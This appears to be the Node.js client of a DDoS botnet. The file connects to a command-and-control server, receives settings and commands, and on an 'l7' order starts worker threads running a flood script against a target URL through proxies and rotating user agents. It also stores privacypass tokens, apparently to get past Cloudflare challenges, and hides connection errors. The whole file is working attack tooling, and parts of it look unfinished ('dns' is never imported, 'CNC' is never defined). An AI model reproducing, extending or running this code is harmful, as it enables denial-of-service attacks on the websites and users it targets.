const net = require('net'),
    events = require('events'),
    {
        Worker
    } = require('worker_threads'),
    fs = require('fs');
process.setMaxListeners(0);
events.EventEmitter.defaultMaxListeners = Infinity;
events.EventEmitter.prototype._maxListeners = Infinity;
var log = console.log;
global.logger = function () {
    var first_parameter = arguments[0];
    var other_parameters = Array.prototype.slice.call(arguments, 1);

    function formatConsoleDate(date) {
        var hour = date.getHours();
        var minutes = date.getMinutes();
        var seconds = date.getSeconds();
        var milliseconds = date.getMilliseconds();

        return '[' +
            ((hour < 10) ? '0' + hour : hour) +
            ':' +
            ((minutes < 10) ? '0' + minutes : minutes) +
            ':' +
            ((seconds < 10) ? '0' + seconds : seconds) +
            '.' +
            ('00' + milliseconds).slice(-3) +
            '] ';
    }

    log.apply(console, [formatConsoleDate(new Date()) + first_parameter].concat(other_parameters));
};

//Encryption : // TO PREVENT SPYERS :eyes: 

let SETTINGS = {
    proxies: [],
    browsers: {},
    privacypass: [],
    userAgents: []
}

// FUNCTIONS

function isJSON(str) {
    try {
        return JSON.parse(str);
    } catch (e) {
        return false;
    }
}

// CONNECTION TO CNC SERVER:

// Global error handling (Ignoring system for helpless error logs)

let ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError'],
    ignoreCodes = ['ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT'];

process.on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
    console.warn(e);
});

global.device = {
    clientSocket: false,
    ip: CNC || 'localhost',
    port: 443
}

device.receiving = '';
device.send = function (obJ) {
    device.clientSocket.write(JSON.stringify(obJ));
}

device.connected = function () {
    device.send({
        op: 'yo'
    });
}

global.stop_all = () => {
    device.attacks.forEach(anatk => {
        if (anatk.proc) {
            anatk.proc.terminate();
        } else {
            logger('No process found. (306)');
        }
    });
    device.attacks = [];
}

device.inputReceived = function (data) {
    process.nextTick(() => {
        var ajson = isJSON(data);
        if (ajson == false) {
            device.receiving += data;
            ajson = isJSON(device.receiving);
            if (ajson == false) {
                //logger("[CONNECTION] Big buffer, memoring data: ", data.length);
                return false;
            } else {
                //logger("[CONNECTION] Successfully read memored data: " + device.receiving.length);
                device.receiving = '';
                device.execute(ajson);
            }
        } else {
            //logger("[CONNECTION] Successfully read data: " + data.length);
            device.execute(ajson);
        }
    })
}

device.resolve = function (cb) {
    if (!device.host) {
        return cb(); //Just use the IP bruh;
    }
    dns.lookup(device.host, (err, address, family) => {
        if (err) {
            logger('[resolver] error in resolving host: ', err);
            return false;
        }
        logger('[resolver] address: %j family: IPv%s', address, family);
        device.ip = address;
        device.syn = Date.now();
        if (cb) cb();
    });
}

function loadPrivacypass() {
    SETTINGS.privacypass = JSON.parse(fs.readFileSync('./privacypass.json', 'utf-8'));
}

if (fs.existsSync('./privacypass.json')) {
    loadPrivacypass();
}

device.reconnect = function () {
    if (device.clientSocket.destroyed || !device.clientSocket || Date.now() - device.ack >= 350000) {
        if (device.clientSocket.connecting) {
            return false; //Already trying to connect
        }
    } else {
        return false; //Already connected;
    }
    logger('[baby] device is reconnecting...');
    stop_all();
    device.clientSocket.end();
    device.receiving = '';
    device.openConnection();
}

device.openConnection = function () {
    var timer;
    if (device.clientSocket.destroyed || !device.clientSocket || Date.now() - device.ack >= 350000) {
        if (Date.now() - device.syn >= 500000) device.resolve();
    } else {
        return false; //Already connected;
    }
    try {
        logger("[INFO] connecting...");
        if (device.ip.length < 1) return false;
        device.clientSocket = net.createConnection(device.port, device.ip);
        device.clientSocket.on('connect', function () {
                device.ack = Date.now();
                logger("[CONNECTION] Successfully connected!");
                device.connected();
            })
            .on('ready', function () {
                device.receiving = '';
                if (!device.ping) {
                    device.ping = setInterval(() => {
                        if (!device.clientSocket.destroyed || Date.now() - device.ack <= 400000) {
                            device.clientSocket.write("\x01");
                        }
                    }, 30e3);
                }
            })
            .on('data', function (data) {
                //logger("[CONNECTION] Received data: ", data.byteLength);
                device.ack = Date.now();
                device.inputReceived(data.toString());
            })
            .on('error', function (err) {
                device.ack = 0;
                if (err.code == "ENOTFOUND") {
                    logger("[ERROR] No device found at this address!");
                } else if (err.code == "ECONNREFUSED") {
                    logger("[ERROR] Connection refused! Please check the IP.");
                } else if (err.code == "ETIMEDOUT") {
                    logger("[ERROR] Connection timed out! Reconnecting.");
                    device.clientSocket.end();
                } else {
                    logger("[CONNECTION] Unexpected error! " + err.message);
                }
                setImmediate(stop_all);
            })
            .on('close', function () {
                logger("[CONNECTION] closed, Reconnecting!");
                setTimeout(device.reconnect, 7e3);
            });
    } catch (err) {
        logger("[CONNECTION] connection failed! " + err);
        setTimeout(device.reconnect, 15e3);
        setImmediate(stop_all);
    }
};

device.attacks = [];

device.execute = function (bruh) {
    switch (bruh.op) {
        case 'update':
            Object.keys(bruh).forEach(akey => {
                SETTINGS[akey] = bruh[akey];
                logger(akey, SETTINGS[akey].length);
            })
            logger('Received settings, Settings size:', JSON.stringify(SETTINGS).length);
            break;
        case 'set':
            Object.keys(bruh).forEach(akey => {
                if (akey == 'privacypass') {
                    if (SETTINGS.privacypass.length < 5) {
                        fs.writeFileSync('./privacypass.json', JSON.stringify(bruh[akey]));
                    } else {
                        return;
                    }
                }
                SETTINGS[akey] = bruh[akey];
                logger('[set]', akey, SETTINGS[akey].length);
            })
            break;
        case 'duplicate':
            logger('[client] duplicate received, closing.');
            process.updating = true;
            handleClose();
            setTimeout(() => { process.exit(5);}, 150);
            break;
        case 'l7':
            let newATKobj = {
                target: bruh.target, // URL of TARGET (l7)
                duration: bruh.duration // Duration in manner of milliseconds.
            }
            newATKobj.proc = new Worker('./flood.js', {
                workerData: {
                    target: bruh.target,
                    proxies: SETTINGS.proxies,
                    userAgents: SETTINGS.userAgents,
                    referers: SETTINGS.referers,
                    duration: bruh.duration,
                    opt: bruh.opt || false,
                    mode: bruh.mode || 'proxy'
                },
                resourceLimits: {
                    maxOldGenerationSizeMb: Infinity,
                    maxYoungGenerationSizeMb: Infinity,
                    codeRangeSizeMb: Infinity
                }
            }).on('exit', code => {
                if (code) {
                    switch (code) {
                        case '8':
                            //Target with too big body, blacklist the target.

                            break;
                    }
                }
            }).setMaxListeners(0);
            setTimeout(() => {
                device.stop_target(bruh.target);
            }, bruh.duration + 10e3);
            device.attacks.push(newATKobj);
            break;
        case 'stop':
            logger('Stopping', bruh);
            device.stop_target(bruh.target, 1);
            break;
        case 'stop_all':
            process.nextTick(stop_all);
            break;
    }
}

device.stop_target = (dtarg, howMany) => {
    var done = 0;
    device.attacks.forEach(anatk => {
        if (done >= howMany) return;
        if (anatk.target == dtarg) {
            if (anatk.proc) {
                anatk.proc.terminate();
            } else {
                logger('No process found. (289)');
            }
            device.attacks.splice(device.attacks.indexOf(anatk), 1);
            done++;
        }
    });
}

//After all has been initialized, Establish connection to CNC server.

device.openConnection();

setInterval(() => {
    loadPrivacypass();
}, 400e3);

exports = {
    bruh: () => {
        return 'BRUHHHHHHHHHH';
    }
}